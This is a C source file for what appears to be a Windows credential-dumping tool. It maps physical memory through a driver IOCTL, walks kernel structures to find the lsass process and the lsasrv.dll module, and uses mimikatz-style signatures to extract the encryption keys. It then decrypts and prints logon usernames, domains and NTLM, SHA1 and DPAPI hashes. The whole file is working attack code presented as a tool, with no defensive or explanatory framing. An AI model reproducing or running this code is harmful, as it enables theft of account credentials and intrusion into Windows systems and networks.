#include "header.h"

ULONGLONG cr3 = 0;
BYTE* memory_data = NULL;
unsigned char gAesKey[16];
unsigned char gDesKey[24];
unsigned char gInitializationVector[16];

DWORD offsetLUIDs,offsetUsername,offsetDomain,offsetPassword;
DWORD AES_OFFSET,DES_OFFSET,IV_OFFSET;

LSAINITIALIZE_NEEDLE LsaInitialize_needle = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
LOGONSESSIONLIST_NEEDLE LogonSessionList_needle = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };


ULONGLONG extractBits(ULONGLONG address, ULONGLONG size, ULONGLONG offset) {
    return (((1 << size) - 1) & (address >> offset));
}

ULONGLONG v2p(ULONGLONG vaddr) {

        ULONGLONG PML4E, PDPE, PDE, PTE;
        ULONGLONG phyaddr = 0;
        ULONGLONG base = 0;
        base = cr3;

        PML4E = base + extractBits(vaddr, 9, 39) * 0x8;

        PDPE = 0;
        memcpy(&PDPE, &memory_data[PML4E], 8);
        PDPE = (extractBits(PDPE, 63, 12) * 0x1000 + extractBits(vaddr, 9, 30) * 0x8) & 0x0fffffffffffff;

        PDE = 0;
        memcpy(&PDE, &memory_data[PDPE], 8);
        PDE = (extractBits(PDE, 63, 12) * 0x1000 + extractBits(vaddr, 9, 21) * 0x8) & 0x0fffffffffffff;

        PTE = 0;
        memcpy(&PTE, &memory_data[PDE], 8);
        if (extractBits(PTE, 1, 7) == 1) {
            phyaddr = (extractBits(PTE, 63, 20) * 0x100000 + extractBits(vaddr, 21, 0) & 0x0fffffffffffff);
            return phyaddr;
        }

        PTE = (extractBits(PTE, 63, 12) * 0x1000 + extractBits(vaddr, 9, 12) * 0x8) & 0x0fffffffffffff;
        memcpy(&phyaddr, &memory_data[PTE], 8);
        phyaddr = (extractBits(phyaddr, 63, 12) * 0x1000 + extractBits(vaddr, 12, 0)) & 0x0fffffffffffff;

        return phyaddr;
    }


int memmem(PBYTE haystack, DWORD haystack_size, PBYTE needle, DWORD needle_size)
{
    int haystack_offset = 0;
    int needle_offset = 0;

    haystack_size -= needle_size;

    for (haystack_offset = 0; haystack_offset <= haystack_size; haystack_offset++) {
        //printf("%d", haystack_offset);
        for (needle_offset = 0; needle_offset < needle_size; needle_offset++)
            if (haystack[haystack_offset + needle_offset] != needle[needle_offset])
                break; // Next character in haystack.

        if (needle_offset == needle_size)
            return haystack_offset;
    }

    return -1;
}



ULONG64 GetNtosBase() {

    LPVOID driverBaseAddresses[1024];
    DWORD sizeRequired;

    if (EnumDeviceDrivers(driverBaseAddresses, sizeof(driverBaseAddresses), &sizeRequired)) {
        return (ULONG64)driverBaseAddresses[0];
    }

    return NULL;
}


ULONG DecryptCredentials(char* encrypedPass, DWORD encryptedPassLen, unsigned char* decryptedPass, ULONG decryptedPassLen) {
    BCRYPT_ALG_HANDLE hProvider, hDesProvider;
    BCRYPT_KEY_HANDLE hAes, hDes;
    ULONG result;
    NTSTATUS status;
    unsigned char initializationVector[16];

    memcpy(initializationVector, gInitializationVector, sizeof(gInitializationVector));

    if (encryptedPassLen % 8) {
        BCryptOpenAlgorithmProvider(&hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
        BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
        BCryptGenerateSymmetricKey(hProvider, &hAes, NULL, 0, gAesKey, sizeof(gAesKey), 0);
        status = BCryptDecrypt(hAes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, sizeof(gInitializationVector), decryptedPass, decryptedPassLen, &result, 0);
        if (status != 0) {
            return 0;
        }
        return result;
    }
    else {
        BCryptOpenAlgorithmProvider(&hDesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
        BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        BCryptGenerateSymmetricKey(hDesProvider, &hDes, NULL, 0, gDesKey, sizeof(gDesKey), 0);
        status = BCryptDecrypt(hDes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, 8, decryptedPass, decryptedPassLen, &result, 0);
        if (status != 0) {
            return 0;
        }
        return result;
    }
}

void getmsv(ULONGLONG start, ULONGLONG end, ULONGLONG size, ULONGLONG dtb) {

    LARGE_INTEGER reader;
    LPSTR lsasrv = (LPSTR)malloc(size);
    ULONGLONG cursor = 0, lsasrv_size = 0, LogonSessionList = 0, currentElem = 0;
    ULONGLONG original = start;
    unsigned char* iv_vector [16], DES_key = NULL;

    DWORD RIP_AES_Offset, RIP_DES_Offset, RIP_LogonSessionList_offset;
    PVOID keyPointer;
    DWORD RIP_IV_OFFSET;
    nt_BCRYPT_HANDLE_KEY h3DesKey, hAesKey;
    nt_BCRYPT_KEY81 extracted3DesKey;

    PBYTE LsaInitialize_needle_buffer = NULL, LogonSession_needle_buffer = NULL;
    DWORD offsetLogonSessionList, offsetLsaInitialize;


    /* Save the whole region in a buffer */
    cr3 = dtb;
    while (start < end) {
        CHAR tmp = NULL;
        __try {
            reader.QuadPart = v2p(start);
            memcpy(&tmp, &memory_data[reader.QuadPart], 1);
            lsasrv[cursor] = tmp;
           
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            
        }
        
        cursor++;
        start = original + cursor;
    }
    lsasrv_size = cursor;

    // Use mimikatz signatures to find the IV/keys
    printf("\n===================[Crypto info]===================\n");
    LsaInitialize_needle_buffer = (PBYTE)malloc(sizeof(LSAINITIALIZE_NEEDLE));
    memcpy(LsaInitialize_needle_buffer, &LsaInitialize_needle, sizeof(LSAINITIALIZE_NEEDLE));
    offsetLsaInitialize = memmem((PBYTE)lsasrv, lsasrv_size, LsaInitialize_needle_buffer, sizeof(LSAINITIALIZE_NEEDLE));

    memcpy(&RIP_IV_OFFSET, lsasrv + offsetLsaInitialize + IV_OFFSET, 4);  //IV offset
   
    reader.QuadPart = v2p(original + offsetLsaInitialize + IV_OFFSET + 4 + RIP_IV_OFFSET);
    memcpy(&gInitializationVector, &memory_data[reader.QuadPart], 16);

    printf("[*] IV: ");
    for (int i = 0; i < 16; i++) {
        printf("%02x", gInitializationVector[i]);
    }
    printf("\n");
   

    memcpy(&RIP_AES_Offset, lsasrv + offsetLsaInitialize + AES_OFFSET, 4); //DES KEY offset
    reader.QuadPart = v2p(original + offsetLsaInitialize + AES_OFFSET + 4 + RIP_AES_Offset);
    memcpy(&keyPointer, &memory_data[reader.QuadPart], 8);

    reader.QuadPart = v2p(keyPointer);
    memcpy(&hAesKey, &memory_data[reader.QuadPart], sizeof(nt_BCRYPT_HANDLE_KEY));

    reader.QuadPart = v2p((ULONGLONG)hAesKey.key);
    memcpy(&extracted3DesKey, &memory_data[reader.QuadPart], sizeof(nt_BCRYPT_KEY81));
    memcpy(gAesKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
    printf("[*] Aes Key: ");
    for (int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
        printf("%02x", gAesKey[i]);
    }
    printf("\n");


    memcpy(&RIP_DES_Offset, lsasrv + offsetLsaInitialize - DES_OFFSET, 4); //DES KEY offset
    reader.QuadPart = v2p(original + offsetLsaInitialize - DES_OFFSET + 4 + RIP_DES_Offset);
    memcpy(&keyPointer, &memory_data[reader.QuadPart], 8);

    reader.QuadPart = v2p(keyPointer);
    memcpy(&h3DesKey, &memory_data[reader.QuadPart], sizeof(nt_BCRYPT_HANDLE_KEY));

    reader.QuadPart = v2p((ULONGLONG)h3DesKey.key);
    memcpy(&extracted3DesKey, &memory_data[reader.QuadPart], sizeof(nt_BCRYPT_KEY81));
    memcpy(gDesKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);


    printf("[*] 3Des Key: ");
    for (int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
        printf("%02x", gDesKey[i]);
    }
    printf("\n");


    LogonSession_needle_buffer = (PBYTE)malloc(sizeof(LOGONSESSIONLIST_NEEDLE));
    memcpy(LogonSession_needle_buffer, &LogonSessionList_needle, sizeof(LOGONSESSIONLIST_NEEDLE));
    offsetLogonSessionList = memmem((PBYTE)lsasrv, lsasrv_size, LogonSession_needle_buffer, sizeof(LOGONSESSIONLIST_NEEDLE));

    memcpy(&RIP_LogonSessionList_offset, lsasrv + offsetLogonSessionList + offsetLUIDs, 4);
    LogonSessionList = original + offsetLogonSessionList + offsetLUIDs + 4 + RIP_LogonSessionList_offset;


    while (currentElem != LogonSessionList) {

        puts("\n==============Start==============");
        if (currentElem == 0) {
            currentElem = LogonSessionList;
        }
        reader.QuadPart = v2p(currentElem);
        memcpy(&currentElem, &memory_data[reader.QuadPart], 8);

        USHORT length = 0, cryptoblob_size = 0;
        LPWSTR username = NULL, domain = NULL;
        ULONGLONG  domain_pointer = 0, username_pointer = 0, credentials_pointer = 0, primaryCredentials_pointer = 0, cryptoblob_pointer = 0;


        reader.QuadPart = v2p(currentElem + offsetUsername);  //UNICODE_STRING = USHORT LENGHT USHORT MAXLENGTH LPWSTR BUFFER
        memcpy(&length, &memory_data[reader.QuadPart], 2);
        username = (LPWSTR)malloc(length + 2);
        memset(username, 0, length + 2);
        reader.QuadPart = v2p(currentElem + offsetUsername + 0x8);
        memcpy(&username_pointer, &memory_data[reader.QuadPart], 8);
        reader.QuadPart = v2p(username_pointer);
        memcpy(username, &memory_data[reader.QuadPart], length);
        printf("[-->] Username: %S\n", username);


        reader.QuadPart = v2p(currentElem + offsetDomain);
        memcpy(&length, &memory_data[reader.QuadPart], 2);
        domain = (LPWSTR)malloc(length + 2);
        memset(domain, 0, length + 2);
        reader.QuadPart = v2p(currentElem + offsetDomain + 0x8);
        memcpy(&domain_pointer, &memory_data[reader.QuadPart], 8);
        reader.QuadPart = v2p(domain_pointer);
        memcpy(domain, &memory_data[reader.QuadPart], length);
        printf("[-->] Domain: %S\n", domain);
        

        reader.QuadPart = v2p(currentElem + offsetPassword);
        memcpy(&credentials_pointer, &memory_data[reader.QuadPart], 8);
        if (credentials_pointer == 0) {
            puts("==============End================");
            continue;
        }

        reader.QuadPart = v2p(credentials_pointer + 0x10);
        memcpy(&primaryCredentials_pointer, &memory_data[reader.QuadPart], 8);

        reader.QuadPart = v2p(primaryCredentials_pointer + 0x18);
        memcpy(&cryptoblob_size, &memory_data[reader.QuadPart], 4);
        if (cryptoblob_size % 8 != 0) {
            printf("[*] Cryptoblob size: (not compatible with 3DEs, skipping...)\n");
            continue;
        }

        reader.QuadPart = v2p(primaryCredentials_pointer + 0x20);
        memcpy(&cryptoblob_pointer, &memory_data[reader.QuadPart], 8);

        unsigned char* cryptoblob = (unsigned char*)malloc(cryptoblob_size);
        reader.QuadPart = v2p(cryptoblob_pointer);
        memcpy(cryptoblob, &memory_data[reader.QuadPart], cryptoblob_size);

        unsigned char passDecrypted[496];
        DecryptCredentials(cryptoblob, cryptoblob_size, passDecrypted, sizeof(passDecrypted));

        PPRIMARY_CREDENTIALS_10 primarycreds = &passDecrypted;
        printf("[-->] NTLM: ");
        for (int i = 0; i < LM_NTLM_HASH_LENGTH; i++) {
            printf("%02x", primarycreds->NtOwfPassword[i]);
        }
        printf("\n");
        printf("[-->] DPAPI: ");
        for (int i = 0; i < LM_NTLM_HASH_LENGTH; i++) {
            printf("%02x", primarycreds->DPAPIProtected[i]);
        }
        printf("\n");
        printf("[-->] SHA1: ");
        for (int i = 0; i < SHA_DIGEST_LENGTH; i++) {
            printf("%02x", primarycreds->ShaOwPassword[i]);
        }
        puts("\n");


        puts("==============End================");
    }


    free(lsasrv);
    
}

void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount, ULONGLONG DirectoryTableBase) {

    /* Variables used to walk the AVL tree*/
    ULONGLONG* queue;
    ULONGLONG cursor = 0, count = 1, last = 1, reader = 0, startingVpn = 0, endingVpn = 0, startingVpnHigh = 0, endingVpnHigh = 0, start = 0, end = 0;
    VAD* vadList = NULL;

   //cr3 = DirectoryTableBase;
    printf("[+] Starting to walk _RTL_AVL_TREE...\n");
    queue = (ULONGLONG*)malloc(sizeof(ULONGLONG) * VadCount * 4); // Make room for our queue
    queue[0] = VadRoot; // Node 0

    vadList = (VAD*)malloc(VadCount * sizeof(*vadList)); // Save all the VADs in an array. We do not really need it (because we can just break when the lsasrv.dll is found) but hey... maybe we want to reuse this code in the future

    while (count <= VadCount) {

        ULONGLONG currentNode, left = 0, right = 0, subsection = 0, control_area = 0, filepointer = 0, fileobject = 0, filename = 0;
        USHORT pathLen = 0;
        PUNICODE_STRING path = NULL;

        currentNode = queue[cursor]; // Current Node, at start it is the VadRoot pointer
        if (currentNode == 0) {
            cursor++;
            continue;
        }
        /* kd > dx - id 0, 0, ffff9984daa986c0 - r1(*((ntkrnlmp!_RTL_BALANCED_NODE*)0xffff9984dcf17ea0))
            (*((ntkrnlmp!_RTL_BALANCED_NODE*)0xffff9984dcf17ea0))[Type:_RTL_BALANCED_NODE]
            [+0x000] Children[Type:_RTL_BALANCED_NODE * [2]]
            [+0x000] Left             : 0xffff9984dcf9d910[Type:_RTL_BALANCED_NODE*]
            [+0x008] Right : 0xffff9984dcfe01b0[Type:_RTL_BALANCED_NODE*]*/

       /* kd > dx - id 0, 0, ffff9984daa986c0 - r1(*((ntkrnlmp!_MMVAD_SHORT*)0xffff9984dcf17ea0))
            (*((ntkrnlmp!_MMVAD_SHORT*)0xffff9984dcf17ea0))[Type:_MMVAD_SHORT]
            [+0x000] VadNode[Type:_RTL_BALANCED_NODE]
            [+0x000] NextVad          : 0xffff9984dcf9d910[Type:_MMVAD_SHORT*]
            [+0x018] StartingVpn : 0xdf5ffa20[Type:unsigned long]
            [+0x01c] EndingVpn : 0xff5ffa1f[Type:unsigned long]
            [+0x020] StartingVpnHigh : 0x7[Type:unsigned char]
            [+0x021] EndingVpnHigh : 0x7[Type:unsigned char]*/

        reader = v2p(currentNode); // Get Physical Address of left node   
        memcpy(&left, &memory_data[reader], sizeof(ULONGLONG));
        queue[last++] = left;

        reader = v2p(currentNode + 0x8); // Get Physical Address of right node
        memcpy(&right, &memory_data[reader], sizeof(ULONGLONG));
        queue[last++] = right; 

        reader = v2p(currentNode + 0x18);
        memcpy(&startingVpn, &memory_data[reader], 4);
        reader = v2p(currentNode + 0x20);
        memcpy(&startingVpnHigh, &memory_data[reader], 1);
        start = (startingVpn << 12) | (startingVpnHigh << 44);

        reader = v2p(currentNode + 0x1c);
        memcpy(&endingVpn, &memory_data[reader], 4);
        reader = v2p(currentNode + 0x21);
        memcpy(&endingVpnHigh, &memory_data[reader], 1);
        end = (((endingVpn + 1) << 12) | (endingVpnHigh << 44));

        //Get the pointer to Subsection (offset 0x48 of __mmvad)
        /*kd > dt _mmvad 0xffff9984dcf17ea0
            nt!_MMVAD
            + 0x000 Core             : _MMVAD_SHORT
            + 0x040 u2 : <unnamed - tag>
            + 0x048 Subsection : 0xffff9984`dab53080 _SUBSECTION*/

        reader = v2p((currentNode + 0x48));
        memcpy(&subsection, &memory_data[reader], 8);

        __try {
            if (subsection != 0 && subsection != 0xffffffffffffffff) {
                //Get the pointer to ControlArea (offset 0 of _SUBSECTION)
                reader = v2p(subsection);
                memcpy(&control_area, &memory_data[reader], 8);

                /*kd > dx - id 0, 0, ffff9984daa986c0 - r1((ntkrnlmp!_SUBSECTION*)0xffff9984dab53080)
                    ((ntkrnlmp!_SUBSECTION*)0xffff9984dab53080) : 0xffff9984dab53080[Type:_SUBSECTION*]
                    [+0x000] ControlArea : 0xffff9984dab53000[Type:_CONTROL_AREA*]
                    [+0x008] SubsectionBase : 0xffffae807c200000[Type:_MMPTE*]*/
           
                if (control_area != 0 && control_area != 0xffffffffffffffff) {
                    //Get the pointer to FileObject (offset 0x40 of _CONTROL_AREA)
                    /* kd > dx - id 0, 0, ffff9984daa986c0 - r1((ntkrnlmp!_CONTROL_AREA*)0xffff9984dab53000)
                        ((ntkrnlmp!_CONTROL_AREA*)0xffff9984dab53000) : 0xffff9984dab53000[Type:_CONTROL_AREA*]
                        [+0x048] ControlAreaLock : 0[Type:long]*/

                    reader = v2p(control_area + 0x40);
                    memcpy(&fileobject, &memory_data[reader], 8);
                    if (fileobject != 0 && fileobject != 0xffffffffffffffff) {

                        // It is an _EX_FAST_REF, so we need to mask the last byte
                        fileobject = fileobject & 0xfffffffffffffff0;

                        //Get the pointer to path length (offset 0x58 of _FILE_OBJECT is _UNICODE_STRING, the len plus null bytes is at +0x2)
                        reader = v2p(fileobject + 0x58 + 0x2);
                        memcpy(&pathLen, &memory_data[reader], 2);

                        //Get the pointer to the path name (offset 0x58 of _FILE_OBJECT is _UNICODE_STRING, the pointer to the buffer is +0x08)
                        reader = v2p(fileobject + 0x58 + 0x8);
                        memcpy(&filename, &memory_data[reader], 8);
                        path = (LPWSTR)malloc(pathLen * sizeof(wchar_t));
                        reader = v2p(filename);
                        memcpy(path, &memory_data[reader], pathLen * 2);

                    
                    }
                }
            }
           
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("Failed reading subsection\n");
        }
        
        vadList[count - 1].id = count - 1;
        vadList[count - 1].vaddress = currentNode;
        vadList[count - 1].start = start;
        vadList[count - 1].end = end;
        vadList[count - 1].size = end - start;
        memset(vadList[count - 1].image, 0, MAX_PATH);


        if (path != NULL) {
            wcstombs(vadList[count - 1].image, path, MAX_PATH);
            free(path);
        }

        count++;
        cursor++;
    }
    //Just print the VAD list
    //printf("\t\t===================[VAD info]===================\n");
    //for (int i = 0; i < VadCount; i++) {
    //    printf("[%lld] (0x%08llx) [0x%08llx-0x%08llx] (%lld bytes)\n", vadList[i].id, vadList[i].vaddress, vadList[i].start, vadList[i].end, vadList[i].size);
    //    if (vadList[i].image[0] != 0) {
    //        printf(" |\n +---->> %s\n", vadList[i].image);
    //    }
    //}
    //printf("\t\t================================================\n");

    puts("===================[VAD info]===================");

    for (int i = 0; i < VadCount; i++) {
        if (!strcmp(vadList[i].image, "\\Windows\\System32\\lsasrv.dll")) { 
            printf("[+] LsaSrv.dll! [0x%08llx-0x%08llx] (%lld bytes)\n", vadList[i].start, vadList[i].end, vadList[i].size);
            getmsv(vadList[i].start, vadList[i].end, vadList[i].size, DirectoryTableBase);
            break;
        }
    }
    free(vadList);
    free(queue);
    return;
}


int main() {

    HKEY hKey;
    const char* subKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
    //const char* valueName = "CurrentBuildNumber";
    const char* valueName = "CurrentBuild";
    char buildNumber[128];

    DWORD bufSize = sizeof(buildNumber);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)buildNumber, &bufSize) == ERROR_SUCCESS) {
            printf("Build Number: %s\n", buildNumber);
        }
        else {
            printf("Failed to read registry value.\n");
        }
        RegCloseKey(hKey);
    }
    else {
        printf("Failed to open registry key.\n");
    }

    HANDLE drv = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (!drv) {
        printf("ERROR!\n");
        return -1;
    }

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);

    if (GlobalMemoryStatusEx(&memoryStatus)) {
        printf("[*] Total physical memory: ~0x%llx bytes\n", memoryStatus.ullTotalPhys);
        printf("[*] Highest available physical memory address: ~0x%llx\n", memoryStatus.ullTotalPhys - 1);
    }
    else {
        printf("[X] Failed to retrieve memory information. Error: %lu\n", GetLastError());
    }

    PVOID out;
    DWORD bytes_returned;

    INPUTBUF* inbuf = (INPUTBUF*)malloc(sizeof(INPUTBUF));
    inbuf->Size = (memoryStatus.ullTotalPhys * 1.5);;
    inbuf->val2 = 0;
    inbuf->val3 = 0;
    inbuf->MappingAddress = 0;
    inbuf->val5 = 0;

    BOOL success = DeviceIoControl(drv, IOCTL_WINIO_MAPPHYSTOLIN, inbuf, sizeof(INPUTBUF), inbuf, sizeof(INPUTBUF), &bytes_returned, (LPOVERLAPPED)NULL);
    printf("[*] Max size: 0x%llx \n", inbuf->Size);

    if (!success) {
        printf("[*] Error calling the driver");
    }
    wprintf(L"[*] Mapped %llx bytes at %p\n", inbuf->Size, inbuf->MappingAddress);


    memory_data = (BYTE*)inbuf->MappingAddress;
    UINT64 eprocess_filename = 0;
    DWORD_PTR physical_offset;
    int EUniqueProcessId, EActiveProcessLinks, EImageFileName, EVadRoot;


    switch (atoi(buildNumber)) {
        case 14393:
            //    /*kd > dt _eprocess UniqueProcessId imagefilename activeprocesslinks priority vadroot vadcount
            //        ntdll!_EPROCESS
            //        + 0x2e8 UniqueProcessId    : Ptr64 Void
            //        + 0x2f0 ActiveProcessLinks : _LIST_ENTRY
            //        + 0x450 ImageFileName : [15] UChar
            //        + 0x620 VadRoot : _RTL_AVL_TREE
            //        + 0x630 VadCount : Uint8B*/
            //    
            //    // Eprocess offsets
            EUniqueProcessId = 0x2e8;
            EActiveProcessLinks = 0x2f0;
            EImageFileName = 0x450;
            EVadRoot = 0x620;

            // lsasrv offsets
            AES_OFFSET = 0x10;
            DES_OFFSET = 0x49;
            IV_OFFSET = 0x3d;

            offsetLUIDs = 0x10;
            offsetUsername = 0x90;
            offsetDomain = 0xA0;
            offsetPassword = 0x108;
            break;

        default:
        //    /*kd > dt _eprocess UniqueProcessId imagefilename activeprocesslinks priority vadroot vadcount
        //        ntdll!_EPROCESS
        //        + 0x440 UniqueProcessId    : Ptr64 Void
        //        + 0x448 ActiveProcessLinks : _LIST_ENTRY
        //        + 0x5a8 ImageFileName : [15] UChar
        //        + 0x7d8 VadRoot : _RTL_AVL_TREE
        //        + 0x7e8 VadCount : Uint8B*/
        //    
                //Eprocessoffsets
            EUniqueProcessId = 0x440;
            EActiveProcessLinks = 0x448;
            EImageFileName = 0x5a8;
            EVadRoot = 0x7d8;

            // lsasrv offsets
            AES_OFFSET = 0x10;
            DES_OFFSET = 0x59;
            IV_OFFSET = 0x43;

            offsetLUIDs = 0x17;
            offsetUsername = 0x90;
            offsetDomain = 0xA0;
            offsetPassword = 0x108;
            break;
    }

    for (physical_offset = 0x100000000; physical_offset < inbuf->Size; physical_offset += sizeof(UINT64)) {
        memcpy(&eprocess_filename, &memory_data[physical_offset], sizeof(UINT64));
        if (eprocess_filename == 0x00006d6574737953) { // System string  ImageFileName : [15] UChar
            if (memory_data[physical_offset + 15] == 2) { // PriorityClass
                if (memory_data[physical_offset - (EImageFileName - EUniqueProcessId)] == 0x04 && memory_data[physical_offset - (EImageFileName - EUniqueProcessId - 1)] == 0x00) {
                    memcpy(&cr3, &memory_data[physical_offset - (EImageFileName - 0x28)], sizeof(UINT64));
                    cr3 = cr3 & 0xfffffffffffff0;
                    __try {
                        if (v2p(GetNtosBase())) {
                            printf("[*] System EPROCESS: 0x%llx\n", physical_offset - EImageFileName);
                            printf("[*] PML4 base:  0x%llx\n", cr3);
                            physical_offset = physical_offset - EImageFileName;
                            break;
                        }
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER) {
                        printf("[-] Incorrect cr3 next one!!!\n");
                    }
                }
            }
        }
    }


    UINT64 flink = 0, physical_flink = 0, imagename = 0;
    memcpy(&flink, &memory_data[physical_offset + EActiveProcessLinks], sizeof(UINT64));
    memcpy(&imagename, &memory_data[physical_offset + EImageFileName], sizeof(UINT64));
    physical_flink = v2p(flink);

 
    while (TRUE) {
        if (imagename == 0x78652e737361736c) {
            puts("[*] Lsass EPROCESS found!!!");
            break;
        }
        memcpy(&flink, &memory_data[physical_flink], sizeof(UINT64));
        physical_flink = v2p(flink);
        memcpy(&imagename, &memory_data[physical_flink + (EImageFileName - EActiveProcessLinks)], sizeof(UINT64));
    }

    ULONGLONG max_physical_memory = 0 , start = 0 , end = 0, DirectoryTableBase = 0, VadCount = 0 , VadRootPointer = 0;

    memcpy(&DirectoryTableBase, &memory_data[physical_flink - (EActiveProcessLinks - 0x28)], sizeof(ULONGLONG));
    DirectoryTableBase = DirectoryTableBase & 0xfffffffffffff0;
    printf("\t[*] DirectoryTableBase: 0x%08llx\n", DirectoryTableBase);
    memcpy(&VadRootPointer, &memory_data[physical_flink + (EVadRoot - EActiveProcessLinks)], sizeof(ULONGLONG));
    printf("\t[*] VadRoot: 0x%08llx [VIRTUAL]\n", VadRootPointer);
    memcpy(&VadCount, &memory_data[physical_flink + (EVadRoot - EActiveProcessLinks) + 0x10], sizeof(ULONGLONG));
    printf("\t[*] El VadCount es: %lld\n\n", VadCount);
    walkAVL(VadRootPointer, VadCount, DirectoryTableBase);


}